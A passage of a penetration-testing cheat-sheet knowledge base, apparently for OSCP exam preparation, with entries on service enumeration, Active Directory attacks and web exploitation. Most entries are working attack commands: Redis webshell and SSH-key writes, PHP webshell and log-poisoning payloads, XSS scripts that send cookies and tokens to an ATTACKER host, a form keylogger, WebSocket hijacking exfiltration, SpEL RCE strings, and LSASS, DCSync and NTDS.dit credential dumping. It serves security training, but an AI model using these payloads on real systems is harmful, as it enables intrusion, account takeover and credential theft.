    smbclient -L //TARGET/ -N                     # list shares, no password
    smbclient //TARGET/share -N                   # connect; get/mget to loot
    smbmap -H TARGET [-u u -p p]                  # shows READ/WRITE per share

## Users, groups, policy
    nxc smb TARGET -u u -p p --users --groups --pass-pol
    enum4linux-ng -A TARGET                       # structured dump
    rpcclient -U '' -N TARGET -c 'enumdomusers'   # (see rpc-enumeration)
    # RID cycling finds users even when enumdomusers is blocked (atlas: ridenum)

## Spray / reuse
    nxc smb TARGET -u users.txt -p 'Season2025!' --continue-on-success   # (Pwn3d!) = admin
    nxc smb TARGET -u user -H <NTLM>              # pass-the-hash

## Gotchas
- SMB signing 'False/disabled' on the scan = relay target (see smb-relay-attack).
- Writable share = drop a webshell / capture a hash (SCF/.url) / stage tools.
- SMBv1 present -> check ms17-010; it's a classic instant SYSTEM on exam-era boxes.

entries.title: FTP enumeration (21)
entries.brief: Anonymous login, version CVEs, bounce scan, and getting files both ways
entries.body:
## Fingerprint
    nmap -p21 -sV --script ftp-anon,ftp-syst,ftp-bounce TARGET
    nc -nv TARGET 21        # banner -> searchsploit the exact version

## Anonymous access
    ftp TARGET      # user: anonymous  pass: anything
    # or: ftp -nv, then  user anonymous ''
    ls -la ; binary ; prompt off ; mget *     # pull everything
    put shell.php                              # if writable + web-reachable = RCE

## Known FTP software CVEs to check
    searchsploit <ftpd> <version>
    # e.g. vsftpd 2.3.4 backdoor, ProFTPd mod_copy (CVE-2015-3306), etc.

## Brute (if no anon)
    hydra -L users.txt -P pass.txt ftp://TARGET

## Gotchas
- Always `binary` before downloading non-text files or they corrupt.
- A writable FTP root mapped to the webroot = upload a shell and browse to it.
- Active vs passive: use `passive` if transfers hang behind NAT/firewall.

entries.title: SSH enumeration (22)
entries.brief: Version/CVE, accepted auth methods, user enumeration and host-key notes
entries.body:
## Fingerprint
    nmap -p22 -sV --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey TARGET
    nc -nv TARGET 22        # banner (OpenSSH version -> searchsploit)
    ssh-audit TARGET        # detailed algo/security report (atlas: ssh-audit)

## Which auth methods are allowed?
    ssh -v user@TARGET      # 'publickey,password' etc. in the debug output
    # publickey-only -> you need a private key (see ssh-key-reuse)

## User enumeration (version-dependent)
    # CVE-2018-15473 (OpenSSH < 7.7): timing distinguishes valid users
    searchsploit openssh user enum

## Access
    ssh user@TARGET                         # password
    ssh -i id_rsa user@TARGET               # key (chmod 600 first)
    hydra -L users.txt -P pass.txt ssh://TARGET   # brute (slow; watch lockout)
    sshpass -p 'pass' ssh user@TARGET       # scripted password login

## Gotchas
- Old OpenSSH + user-enum CVE lets you validate usernames before brute-forcing.
- Weak/forced-command keys, or `authorized_keys` with options, can still grant a shell.
- Reuse found keys everywhere before cracking (see ssh-key-reuse).

entries.title: DNS enumeration & zone transfer (53)
entries.brief: AXFR to dump an entire zone, plus records, reverse lookups and subdomain brute
entries.body:
## Identify the nameservers
    dig NS corp.com @TARGET ; host -t ns corp.com TARGET
    nmap -p53 -sU -sV TARGET

## Zone transfer (AXFR) — the jackpot
    dig AXFR corp.com @NAMESERVER            # dumps EVERY record if misconfigured
    host -l corp.com NAMESERVER
    dnsrecon -d corp.com -t axfr             # (atlas: dnsrecon)
A successful AXFR hands you all subdomains/hosts/IPs at once — map the whole estate.

## If AXFR is refused
    dnsenum corp.com ; fierce --domain corp.com      # brute subdomains
    dig ANY corp.com @NS ; dig TXT/MX/SRV corp.com @NS
    dnsrecon -d corp.com -D subs.txt -t brt          # dictionary brute

## Reverse / internal
    dig -x 10.10.10.5 @NS       # PTR records can reveal hostnames
    # internal DNS on a DC often leaks AD host naming

## Gotchas
- Try AXFR against EVERY listed nameserver — often only one is misconfigured.
- 53 is TCP (zone transfer / big responses) and UDP (queries) — scan both.
- SRV records (_ldap._tcp, _kerberos) confirm AD and name the DCs.

entries.title: Redis enumeration & abuse (6379)
entries.brief: Unauthenticated Redis: dump keys, then write a webshell / SSH key / cron for RCE
entries.body:
## Connect & enumerate
    redis-cli -h TARGET                      # often NO auth
    nmap -p6379 --script redis-info TARGET
    INFO ; CONFIG GET dir ; CONFIG GET dbfilename
    KEYS * ; GET <key>                       # loot cached data/sessions/creds

## Abuse A — write a webshell (if webroot writable)
    CONFIG SET dir /var/www/html
    CONFIG SET dbfilename shell.php
    SET x '<?php system($_GET[c]); ?>'
    SAVE                                     # browse shell.php?c=id

## Abuse B — write an SSH authorized_key
    (echo; echo 'ssh-ed25519 AAAA... me'; echo) | redis-cli -h TARGET -x SET k
    CONFIG SET dir /root/.ssh ; CONFIG SET dbfilename authorized_keys ; SET ... ; SAVE
    ssh -i mykey root@TARGET

## Abuse C — cron (write to /var/spool/cron)
    CONFIG SET dir /var/spool/cron/crontabs ; set a job -> reverse shell

## Gotchas
- Needs write perms on the target dir and Redis running as a user that owns it (often root).
- `requirepass` set? try common passwords or look for it in app configs.
- Newer Redis also has RCE via malicious modules (MODULE LOAD) when protected-mode is off.

entries.title: NTP enumeration (123/udp)
entries.brief: Query time servers for host lists (monlist), version, and amplification potential
entries.body:
## Query it
    nmap -sU -p123 --script ntp-info,ntp-monlist TARGET
    ntpq -c readvar TARGET          # server variables/version
    ntpdc -c monlist TARGET         # legacy: last 600 clients that talked to it

## Why it matters
    # monlist (CVE-2013-5211) leaks recent client IPs -> map internal hosts
    # it's also the classic DDoS amplification vector (not your goal on an exam)
    # version/variables can fingerprint the OS and reveal internal names

## Gotchas
- 123 is UDP — needs `nmap -sU`; easy to miss.
- monlist is disabled on patched ntpd; when present it's a quick internal-host leak.
- Mainly a recon/host-discovery source on modern targets, not a direct foothold.

entries.title: OSCP exam — time & point management
entries.brief: A pragmatic 24-hour plan: point budget, rotation rules, and when to step away
entries.body:
## The math (70 to pass)
Typical layout: an AD set (worth a large chunk as a whole) + standalone machines with
local.txt (lower) and proof.txt (higher). Plan to clear enough for 70+ WITH a working report.
Confirm the CURRENT point breakdown on your exam guide — it changes.

## A sane schedule
    0-1h    : enumerate EVERYTHING in parallel (all targets, full nmap + service enum)
    1-6h    : go after the AD chain (it's the biggest single block)
    6-18h   : standalones; bag each local.txt, then push to proof.txt
    18-20h  : mop up partials, re-enumerate anything stuck
    20-24h  : STOP hacking ~=4h out; screenshots + report

## Rotation rules (avoid the rabbit hole)
- Stuck ~45-60 min with no new info -> switch targets. Come back with fresh eyes.
- Re-enumerate before you despair: a missed port/vhost/service is the usual cause.
- Every foothold: grab the flag screenshot IMMEDIATELY (see report-writing-guide).

## Human factors
- Sleep a few hours — tired enumeration misses the obvious. Eat, hydrate, walk.
- Keep a running log per target (what you tried) so you don't repeat work.

## Gotchas
- Don't over-invest in one 'almost' box; points are points — breadth beats depth at 69.
- Metasploit/auto-tooling is restricted on OSCP — know the current rules before you lean on it.
- No report = no pass even at 100 points. Protect the last ~4 hours.

entries.title: OSCP report writing
entries.brief: Structure, reproducible steps, the right screenshots, and proof-file handling
entries.body:
## What graders want
A report another tester could FOLLOW to reproduce every compromise. Clarity and repeatable steps
matter more than prose. Use the official template as your skeleton.

## Structure (per machine)
    1. Summary: IP, how you got user, how you got root/SYSTEM
    2. Enumeration: the scans + the finding that mattered (not every line of output)
    3. Initial access: the exact exploit/command + a screenshot of the shell + whoami
    4. Privilege escalation: the vector + exact steps + screenshot of root/SYSTEM + whoami
    5. Proof: local.txt / proof.txt contents with the required context

## Screenshots that count
    # the flag AND proof you earned it, in one shot:
    type proof.txt & whoami & ipconfig        # Windows
    cat proof.txt ; id ; ip a                 # Linux
Capture the command + output together; include the target IP in frame.

## Proof files
- local.txt (user) and proof.txt (root/SYSTEM) — show the hash WITH whoami+ip in the same screenshot.
- Paste the flag value into the report text too, not just an image.

## Practical tips
- Write as you go (see note-taking): paste commands/screens into the report live, don't reconstruct.
- Number steps so they're reproducible; redact nothing that's needed to reproduce.
- Export to PDF, follow the submission naming, and submit before the deadline.

## Gotchas
- Missing whoami/ip beside a flag = a grader can't verify it = lost points.
- Don't include failed rabbit-holes as if they worked; show the path that actually did.
- Back up screenshots/notes off the VM as you go (shared folder) — see methods/full-workflow.

entries.title: Password spraying Active Directory (safely)
entries.brief: One password across many users, under the lockout threshold, to find a foothold
entries.body:
## The idea
Brute-forcing one account locks it out; spraying tries ONE password against MANY users, staying
below the lockout threshold. One reused/weak password across a big user list is a classic foothold.

## 1. Build the user list
    # from enum: rpcclient enumdomusers, nxc --users, kerbrute userenum, ldapsearch
    # from names: username-anarchy (atlas) on harvested employee names

## 2. Read the lockout policy FIRST
    nxc smb DC -u u -p p --pass-pol      # or: polenum / net accounts /domain
    # note lockoutThreshold + observation window -> stay 1-2 attempts under it per window

## 3. Spray
    kerbrute passwordspray -d corp.local users.txt 'Autumn2025!'   # quiet (Kerberos pre-auth)
    nxc smb DC -u users.txt -p 'Autumn2025!' --continue-on-success
    # good candidates: Season+Year!, Company123!, Welcome1, password-equals-username

## 4. Validate hits everywhere
    nxc smb TARGETS -u found_user -p 'Autumn2025!'   # (Pwn3d!) = local admin somewhere

## Gotchas
- kerbrute spraying is quieter and doesn't always increment the lockout counter the same way as SMB.
- Spray ONE password, wait the observation window, then the next — never loop passwords per user.
- Check `description` fields and AS-REP/Kerberoast (see those) before brute-style spraying.

entries.title: AS-REP roasting
entries.brief: Accounts with 'do not require Kerberos pre-auth' give a crackable hash without any creds
entries.body:
## The idea
If an account has 'Do not require Kerberos preauthentication' set, the KDC returns an AS-REP
encrypted with the user's key to ANYONE who asks — crack it offline for the password. Often needs
NO valid credentials, just a username list.

## Harvest (no creds needed)
    impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip DC -format hashcat
    # with creds, find all preauth-disabled users automatically:
    impacket-GetNPUsers corp.local/user:pass -request -dc-ip DC
    nxc ldap DC -u user -p pass --asreproast out.txt

## Crack
    hashcat -m 18200 asrep.txt rockyou.txt
    john --format=krb5asrep asrep.txt

## Why it matters
It's a credential-free win when a user list is available and any account has preauth off — a very
common OSCP/HTB AD entry point. The $krb5asrep$ hash starts with that marker.

## Gotchas
- `-format hashcat` so the output feeds hashcat -m 18200 directly.
- No preauth-disabled accounts? pivot to Kerberoasting (needs any domain creds) — see kerberoasting-deep.
- Validate usernames first (kerbrute userenum) so you don't waste requests.

entries.title: Pass-the-hash & credential reuse
entries.brief: Authenticate with an NTLM hash instead of a password across SMB/WinRM/RDP
entries.body:
## The idea
NTLM auth proves knowledge of the hash, not the plaintext — so a dumped NT hash logs you in without
cracking it. Reuse local-admin and domain hashes across hosts to move laterally.

## Where you get hashes
    # SAM dump, LSASS, secretsdump, LAPS -> see lsass-dump / windows-credential-hunting / laps-abuse
    # format for PtH is the NT part: aad3b...:<NThash>  (use the NT hash)

## Use the hash
    nxc smb TARGETS -u Administrator -H <NThash> --local-auth    # spray a local-admin hash
    evil-winrm -i TARGET -u user -H <NThash>                     # WinRM shell
    impacket-psexec -hashes :<NThash> user@TARGET                # SYSTEM shell
    impacket-wmiexec / smbexec -hashes :<NThash> user@TARGET
    xfreerdp /u:user /pth:<NThash> /v:TARGET                     # RDP (needs Restricted Admin)

## Overpass-the-hash (hash -> Kerberos)
    # turn an NT hash into a TGT, then use Kerberos tooling:
    impacket-getTGT corp.local/user -hashes :<NThash>   # then KRB5CCNAME=... psexec -k

## Gotchas
- `--local-auth` for a local SAM hash; omit for a domain account.
- The LOCAL admin hash is frequently reused across many machines -> spray it everywhere.
- AES-only / PtH mitigations: fall back to overpass-the-hash or the plaintext if cracked.

entries.title: DCSync — replicate secrets from the DC
entries.brief: With replication rights, pull any account's hash (incl. krbtgt) using the DRS protocol
entries.body:
## What it is
DCSync abuses the directory-replication right (DS-Replication-Get-Changes[-All]) to ask a DC for
account password hashes over MS-DRSR — exactly as another DC would. Domain Admins have it; so do
some delegated accounts and misconfigured ACLs.

## Who can do it
    # BloodHound 'DCSync'/GetChanges edges, or members of Domain Admins/Administrators
    # check your own rights before trying

## Pull hashes
    impacket-secretsdump -just-dc corp.local/user:pass@DC          # all domain hashes
    impacket-secretsdump -just-dc-user krbtgt corp.local/user:pass@DC   # just krbtgt
    nxc smb DC -u user -p pass --ntds                              # alternative
    # Windows: mimikatz lsadump::dcsync /user:krbtgt

## Why krbtgt matters
The krbtgt hash is the key to forging tickets; dumping it is the usual 'own the domain' milestone.
Dumping any target user's hash enables pass-the-hash as them.

## Gotchas
- Needs the replication right — it's an abuse of granted permissions, not an exploit.
- `-just-dc` pulls from NTDS via replication without touching disk on the DC.
- Loud to a tuned SIEM, but standard on exams once you hold the rights.

entries.title: LSASS dumping — methods and parsing
entries.brief: Several ways to capture LSASS memory, then extract credentials offline
entries.body:
## Why LSASS
LSASS caches credentials of logged-on users: NT hashes, Kerberos tickets, and sometimes plaintext.
Dump it (needs SeDebug/admin), then parse the dump on Kali to keep Mimikatz off the target.

## Dump methods (pick what's available / least flagged)
    procdump.exe -accepteula -ma lsass.exe lsass.dmp          # signed MS binary (atlas: procdump)
    rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\lsass.dmp full   # LOLBAS, no upload
    # Task Manager -> lsass.exe -> Create dump file (GUI)
    nxc smb TARGET -u u -H hash -M lsassy                     # remote, parses for you

## Parse offline (on Kali)
    pypykatz lsa minidump lsass.dmp          # NT hashes, tickets, plaintext
    # or mimikatz on Windows: sekurlsa::minidump lsass.dmp ; sekurlsa::logonpasswords

## Then
Pass-the-hash / crack / pass-the-ticket with what you recover (see pass-the-hash).

## Gotchas
- comsvcs.dll MiniDump needs the correct lsass PID (`tasklist | findstr lsass`) and admin.
- AV/Defender heavily watches LSASS access — the comsvcs/procdump split-then-parse approach helps.
- Credential Guard present -> plaintext/NTLM may be protected; you'll still often get tickets.

entries.title: Telnet enumeration (23)
entries.brief: Banner grab, default creds, and sniffable plaintext on this legacy service
entries.body:
## Spot & banner
    nmap -p23 -sV --script telnet-ntlm-info,telnet-encryption TARGET
    telnet TARGET 23        # banner often names the device/OS (routers, IoT, old UNIX)

## Access
    telnet TARGET           # try default/blank creds for the device model
    hydra -L users.txt -P pass.txt telnet://TARGET

## Why it matters
    # telnet is 100% plaintext -> if you can MITM/sniff, you capture creds (see ettercap/dsniff)
    # telnet-ntlm-info can leak a Windows hostname/domain on some services
    # presence usually means a legacy/embedded device with weak defaults

## Gotchas
- Device banners (Cisco/printer/IoT) point you straight to default-credential lists.
- Some 'telnet' ports are actually other services echoing a banner — confirm with -sV.
- Treat any telnet find as a strong 'old/weak box' signal.

entries.title: MongoDB enumeration (27017)
entries.brief: Connect to an often-unauthenticated MongoDB, list databases and dump collections
entries.body:
## Spot it
    nmap -p27017 -sV --script mongodb-info,mongodb-databases TARGET

## Connect (frequently NO auth)
    mongosh --host TARGET          # or legacy: mongo TARGET
    mongosh 'mongodb://TARGET:27017'

## Enumerate & loot
    show dbs
    use <db> ; show collections
    db.<collection>.find().pretty()      # dump records (creds/tokens/PII)
    db.users.find()                      # app user tables, hashes to crack

## With creds
    mongosh -u admin -p 'pass' --authenticationDatabase admin --host TARGET

## Gotchas
- Default bind historically exposed 27017 with no auth — a straight data-loot win.
- NoSQL injection in the app in front of it is a separate path (see nosql-injection).
- Hashes in collections (bcrypt/sha) -> crack with hashcat; reuse creds elsewhere.

entries.title: LFI/RFI wrappers & log poisoning
entries.brief: PHP wrappers, data/expect, and log/session poisoning to turn file inclusion into RCE
entries.body:
## Confirm the inclusion
    ?page=/etc/passwd           # LFI
    ?page=....//....//etc/passwd # bypass naive ../ stripping
    ?page=php://filter/convert.base64-encode/resource=index.php   # read PHP source

## Wrappers -> RCE
    data://   ?page=data://text/plain;base64,<b64 of <?php system($_GET[c]);?>>   (needs allow_url_include)
    expect:// ?page=expect://id       (needs the PHP expect module)
    php://input + POST body '<?php system($_GET[c]);?>'   (allow_url_include)
    php://filter chains -> code exec without any of the above (see php-filter-chain-rce)

## Log poisoning (no wrappers needed)
    # 1. put PHP in a log the app writes:
    curl http://t -A '<?php system($_GET[c]); ?>'          # User-Agent -> access.log
    # 2. include the log:
    ?page=/var/log/apache2/access.log&c=id
    # other sinks: /var/log/auth.log (ssh USER=<?php...>), /proc/self/environ, mail, sessions

## Session / wrapper tricks
    ?page=/var/lib/php/sessions/sess_<PHPSESSID>   # poison a session var first, then include it
    zip:// and phar://   # include code inside an uploaded archive (see php-deserialization-phar)

## RFI (rarer)
    ?page=http://ATTACKER/shell.txt    # only if allow_url_include=On

## Gotchas
- null-byte (%00) truncation is dead on modern PHP; use php://filter / wrappers instead.
- A forced `.php` suffix -> use `php://filter` to read source, or wrapper/log poisoning for exec.
- Find the right log path from the server banner (apache/nginx) and permissions.

entries.title: XSS to account takeover
entries.brief: Turn a stored/reflected XSS into session hijack, token theft or a silent admin action
entries.body:
## Beyond alert(1) — the real impact
A confirmed XSS running in a victim's session can steal auth material or just DO the action as them.

## Steal the session (if cookie is not HttpOnly)
    <script>new Image().src='http://ATTACKER/?c='+document.cookie</script>
    fetch('http://ATTACKER/?c='+encodeURIComponent(document.cookie))

## HttpOnly cookie? steal tokens / act directly
    // exfil a CSRF token or bearer from the DOM/localStorage:
    fetch('/profile').then(r=>r.text()).then(t=>fetch('http://ATTACKER/?d='+btoa(t)))
    // or perform the privileged action in-session (change email/password, add admin):
    fetch('/account/email',{method:'POST',body:'email=me@evil.com',credentials:'include'})

## Hook / keylog a login form
    document.forms[0].onsubmit=e=>navigator.sendBeacon('http://ATTACKER/',new FormData(e.target))

## Deliver it
- Stored XSS: plant once, fires for every viewer (best — hits admins).
- Reflected/DOM: craft a URL and get the victim to open it (see dom-xss-sources-sinks).

## Gotchas
- HttpOnly blocks cookie theft but NOT in-session actions or token-from-DOM theft.
- CSP can block inline/exfil — use allowed sinks, `fetch` to a same-site endpoint, or beacon.
- Blind/stored admin-only XSS: use an OOB collector (see blind-xss / oob-callbacks).

entries.title: DOM XSS — sources and sinks
entries.brief: Find client-side XSS by tracing attacker-controlled sources into dangerous JS sinks
entries.body: ## The model DOM XSS happens entirely in the browser: a SOURCE (attacker-controllable value) flows into a SINK (an API that executes/renders it) with no server round-trip. Find the flow in the JS. ## Common sources location (href/hash/search), document.URL, document.referrer, window.name, postMessage event.data, localStorage/sessionStorage, document.cookie ## Dangerous sinks eval(), Function(), setTimeout/setInterval(string), element.innerHTML/outerHTML, document.write(), jQuery $(...).html()/append(), location=, el.src/href, insertAdjacentHTML ## Hunt it # grep the site's JS (see atlas: getjs/linkfinder) for sinks, then trace back to a source: rg -n 'innerHTML|document.write|eval\(|location\.(hash|search)' app.js # test the hash sink: https://t/# # postMessage sink: send a crafted message from an attacker page ## Gotchas - Payload never hits the server -> server-side WAFs don't see it; look in the browser/DevTools. - Fragment (#...) is not sent to the server, making hash-based DOM XSS easy to miss in logs. - Then escalate with **xss-to-account-takeover**; for OOB use **blind-xss** collectors.

entries.title: CSRF and token-protection bypass
entries.brief: Forge state-changing requests and defeat weak CSRF-token/SameSite defenses
entries.body:
## Baseline CSRF
If a state-changing request relies only on the cookie (no unpredictable token), host a page that
auto-submits it from the victim's browser:
    <form action='https://t/account/email' method=POST>
      <input name=email value=me@evil.com></form><script>document.forms[0].submit()</script>

## Token-protection bypasses (try in order)
- **Remove the token**: delete the param/field entirely — some apps only check if present.
- **Empty / any value**: token blank or garbage still accepted.
- **Reuse**: one user's token valid for another / not tied to session.
- **Method swap**: POST-protected but GET works, or override with _method / X-HTTP-Method-Override.
- **Content-Type**: switch to text/plain or multipart to dodge a JSON-only token check.
- **Token in a predictable place**: leaked via Referer, reflected, or guessable.

## SameSite considerations
    # SameSite=Lax blocks cross-site POST cookies but allows top-level GET navigations;
    # Lax+GET state change, or a same-site XSS/subdomain, can still carry the cookie.

## Gotchas
- Pair CSRF with XSS (same-site) to read the token, then forge with it.
- JSON endpoints with no CSRF token but reflective CORS -> see cors-misconfig.
- Confirm impact: the forged action must actually change state as the victim.

entries.title: OAuth / OIDC abuse
entries.brief: redirect_uri hijack, missing state, token leakage and account linking flaws
entries.body:
## redirect_uri manipulation (the big one)
If the provider doesn't strictly match redirect_uri, point it at your server to capture the code/token:
    ?redirect_uri=https://attacker.com
    # bypass tricks: open-redirect on the real host, path/subdomain tricks,
    #   https://real.com.attacker.com, https://real.com@attacker.com, ?redirect_uri=real.com/../
Capture the leaked `code` (then exchange it) or an implicit-flow `access_token` in the fragment.

## Missing / static state = CSRF on login
No `state` (or a predictable one) lets you force-link the victim's session to YOUR account
(or vice-versa) — account takeover via OAuth CSRF.

## Token leakage
    # access_token in the URL fragment -> Referer leak to third-party scripts/analytics
    # overly broad scope, or a token accepted by an audience it wasn't issued for

## Account linking / pre-takeover
    # sign-in-with provider that trusts an unverified email = link to a victim's account
    # register victim@email locally first, then they OAuth in and get merged

## Gotchas
- Always test redirect_uri validation first — it's the most common and highest-impact flaw.
- Decode the id_token (JWT) and check alg/issuer/audience (see jwt-attacks-advanced).
- Implicit flow puts tokens in the fragment (client-side) — prime for leakage.

entries.title: WebSocket security — CSWSH & message tampering
entries.brief: Cross-site WebSocket hijacking and testing per-message auth/injection
entries.body:
## Cross-Site WebSocket Hijacking (CSWSH)
If the WS handshake authenticates ONLY via cookies and doesn't check Origin, an attacker page can
open a socket in the victim's context and read/drive it:
    <script>
      var ws=new WebSocket('wss://target/chat');
      ws.onmessage=e=>fetch('https://attacker/?d='+btoa(e.data));  // exfil victim's messages
      ws.onopen=()=>ws.send('{"action":"readMessages"}');
    </script>

## Test the handshake
    # does it validate Origin? replay the Upgrade request with a forged Origin header
    # is auth a cookie (hijackable) or a token in the first message (less so)?

## Message-level testing (see atlas: websocat / Burp)
    - injection in message fields (SQLi/NoSQLi/command) — the server often trusts WS input
    - authorization per message: can you call admin actions after a normal-user handshake?
    - tamper/replay messages; check sequence/nonce handling

## Gotchas
- WS does NOT enforce the Same-Origin Policy — Origin checking is the server's job; many skip it.
- Cookie-only auth + no Origin check = CSWSH; token-in-message auth resists it.
- Use websocat or Burp's WebSocket tooling to drive/tamper frames (see api-testing-methodology).

entries.title: Note-taking for pentests & the OSCP exam
entries.brief: Capture everything reproducibly as you go so the report writes itself
entries.body:
## Why it matters
You can't reconstruct a 24-hour exam from memory. Good notes = a fast, complete report and no
re-doing work. Write as you exploit, not after.

## Structure (one page per target)
    # <IP> <hostname>
    ## Enumeration   (nmap + service findings, the one that mattered)
    ## Foothold      (exact commands + the shell/whoami screenshot)
    ## Privesc       (vector + exact steps + root/SYSTEM screenshot)
    ## Loot/creds    (hashes, passwords, keys found -> where reused)
    ## Flags         (local.txt / proof.txt with whoami+ip)

## Capture reproducibly
- Paste the COMMAND and its key output, not just the result — a grader must reproduce it.
- Screenshot every flag with `whoami`/`id` + IP in the same frame (see report-writing-guide).
- Keep a creds table: credential | source | works-on — this drives lateral movement.

## Tooling (pick ONE and stick to it)
    CherryTree / Obsidian / Markdown + screenshots / Sublime ; the oscp CLI's `oscp notes`
    # back notes + screenshots off the VM continuously (shared folder) — see lab-setup

## Gotchas
- Timestamp and label screenshots immediately; unlabeled shots are useless at report time.
- Record dead-ends briefly too, so you don't repeat them at hour 18.
- See **report-writing-guide** and **exam-time-management** for the full exam loop.

entries.title: TFTP enumeration (69/udp)
entries.brief: Grab/put files on an unauthenticated TFTP server and guess common filenames
entries.body:
## Spot it
    nmap -sU -p69 -sV --script tftp-enum TARGET
    # TFTP is UDP, no auth, no directory listing -> you must know/guess filenames

## Interact
    tftp TARGET
    tftp> get <filename>      # download (config backups, firmware, scripts)
    tftp> put shell.php       # upload (if writable + you know where it lands)
    # one-shot: curl tftp://TARGET/startup-config -o cfg

## Filenames to try
    startup-config, running-config, backup.conf, *.cfg (routers/switches),
    unattend.xml, web.config, boot files, any name leaked elsewhere on the host

## Why it matters
TFTP commonly serves network-device configs (with password hashes/SNMP strings) and PXE/boot files
- a config pull can hand you creds for the whole environment.

## Gotchas
- No listing -> brute/guess names; harvest candidates from HTTP, SNMP, or docs first.
- 69 is UDP; use `nmap -sU` or it won't show.
- Upload only works if the server allows writes AND the path is reachable (e.g. a webroot).

entries.title: Spring4Shell (CVE-2022-22965)
entries.brief: Class-loader data binding in Spring MVC/WebFlux on JDK9+ leading to a webshell
entries.body:
## What it is
CVE-2022-22965: Spring's request data binding can reach `class.module.classLoader.*`, letting an
attacker rewrite Tomcat's logging properties to drop a JSP webshell. Needs Spring MVC/WebFlux on
**JDK 9+**, packaged as a WAR on Tomcat (the classic exploitable combo).

## Fingerprint
    whatweb http://t ; look for Spring (Whitelabel Error Page), /actuator, .do endpoints
    searchsploit spring4shell

## Exploit (use a maintained PoC)
The public PoCs POST crafted `class.module.classLoader.resources.context.parent.pipeline...`
parameters to set a malicious access-log pattern, writing a JSP shell:
    python3 spring4shell_poc.py --url http://t/path
    # then: curl 'http://t/shell.jsp?cmd=id'

## Related Spring bugs
- **Spring Cloud Function SpEL (CVE-2022-22963)**: RCE via `spring.cloud.function.routing-expression` header.
- actuator misconfig (/actuator/env, /heapdump) leaks secrets — see below.

## Gotchas
- JDK 8 / non-WAR deployments are generally NOT exploitable for the classic webshell path.
- Blind? the PoC can write to a known webroot path; verify by requesting the JSP.
- Don't confuse with Log4Shell (see log4shell-jndi) — different root cause.

entries.title: Grafana path traversal / LFI (CVE-2021-43798)
entries.brief: Unauthenticated directory traversal in Grafana plugin paths reads arbitrary files
entries.body:
## What it is
CVE-2021-43798: Grafana 8.0.0-8.3.0 lets an UNAUTHENTICATED user traverse out of a plugin's
public dir and read any file the Grafana process can access.

## Fingerprint
    curl -s http://t:3000/login | grep -i grafana      # version in page/meta or /api/health
    curl -s http://t:3000/api/health

## Read files
    curl --path-as-is 'http://t:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
    # any installed plugin id works (alertlist, graph, text, ...)

## What to grab
    /etc/grafana/grafana.ini            # admin creds, secret_key
    /var/lib/grafana/grafana.db         # SQLite: data_source creds, user hashes
    /etc/passwd, app configs, SSH keys  # anything grafana can read

## After the DB
    # grafana.db data_source passwords are AES-encrypted with secret_key from grafana.ini
    # -> decrypt to recover backend DB creds (reuse them!)  (see sqlite3 atlas entry)

## Gotchas
- Use `--path-as-is` so curl doesn't normalise the ../ sequences away.
- Default Grafana port is 3000; also check behind reverse proxies on /grafana.
- It's file READ, not RCE — the win is looted datasource/admin creds -> reuse.

entries.title: Expression Language (EL) injection
entries.brief: Java EL/SpEL in ${...} contexts (JSF, Spring, validation messages) leading to RCE
entries.body:
## The idea
Java Expression Language evaluates `${...}` / `#{...}`. When user input lands in an EL/SpEL
evaluation sink (JSF attributes, Spring SpEL, bean-validation messages, some template engines),
it executes Java -> RCE.

## Detect
    ${7*7}      #{7*7}      ${{7*7}}       # a 49 back = EL evaluated
    # test in: validation error messages, search fields reflected into JSF, SpEL params

## SpEL to RCE (Spring)
    #{T(java.lang.Runtime).getRuntime().exec('id')}
    #{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

## JSF / Jakarta EL to RCE
    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(...,'id')}
    ${facesContext.getExternalContext().getRequest()...}   # context-dependent gadgets

## Relationship to SSTI/OGNL
EL, SpEL, OGNL and template SSTI are cousins — same 'expression reaches evaluator' bug class.
If `${}` fails, try `#{}`, `*{}`, `@{}`; see **ssti-to-rce** and **struts-ognl-rce**.

## Gotchas
- Sandboxed/limited evaluators need a reflection gadget (T(...).forName) rather than direct calls.
- Bean-validation message injection is a classic, easily-missed EL sink.
- Blind? use an **oob-callbacks** command to confirm.

entries.title: Exposed .git & repo forensics
entries.brief: Dump an exposed .git directory and mine its history for secrets and source
entries.body:
## Detect an exposed repo
    curl -s http://t/.git/HEAD           # 'ref: refs/heads/...' = exposed
    curl -s http://t/.git/config
    nuclei -t http/exposures/configs/git-config.yaml -u http://t

## Dump it (even without directory listing)
    git-dumper http://t/.git/ ./loot     # reconstructs the repo from objects (atlas: git-dumper)
    # fallback: gittools (gitdumper.sh + extractor.sh)

## Mine the history (the real value)
    cd loot
    git log --oneline --all ; git log -p            # full history & diffs
    git show <commit>                               # a removed secret still lives in old commits
    trufflehog filesystem . ; gitleaks detect -s .  # automated secret scan (atlas entries)
    noseyparker scan --git-history=full .           # deep history scan

## What you find
    hardcoded DB/API creds, .env files, private keys, internal hostnames/endpoints,
    and the SOURCE CODE itself -> read it for more vulns (whitebox).

## Gotchas
- A secret 'deleted' in a later commit is still recoverable from history — always `git log -p`.
- Same idea for exposed .svn/.hg and CI files (.gitlab-ci.yml, Jenkinsfile) with inline creds.
- The recovered source is a gift: pivot to source review (see api-testing-methodology / semgrep).

entries.title: NTDS.dit extraction — dump the whole domain
entries.brief: Once you reach a DC (or a backup), pull NTDS.dit + SYSTEM and extract every hash
entries.body:
## What NTDS.dit is
The AD database on a DC holds every domain account's password hash. Extracting it = all domain
hashes (incl. krbtgt). You need DC admin / backup rights, or a copy of the files.

## Remote (cleanest) — DCSync-style
    impacket-secretsdump -just-dc corp.local/dauser:pass@DC     # over the wire, no disk touch
    nxc smb DC -u dauser -p pass --ntds                          # same, via nxc

## On the DC — volume shadow copy
    # create a shadow copy so you can read the locked NTDS.dit:
    vssadmin create shadow /for=C:
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\NTDS.dit C:\n.dit
    reg save HKLM\SYSTEM C:\sys.hive
    # or: ntdsutil 'ac i ntds' 'ifm' 'create full C:\out' q q

## Extract hashes offline (on Kali)
    impacket-secretsdump -ntds n.dit -system sys.hive LOCAL

## Gotchas
- You need SYSTEM hive too — NTDS.dit alone can't be decrypted.
- krbtgt hash from here enables ticket forging; any user's hash enables PtH (see pass-the-hash/dcsync).
- Remote `-just-dc` is quieter and easier than the shadow-copy dance when you have the rights.

entries.title: AWS S3 bucket enumeration
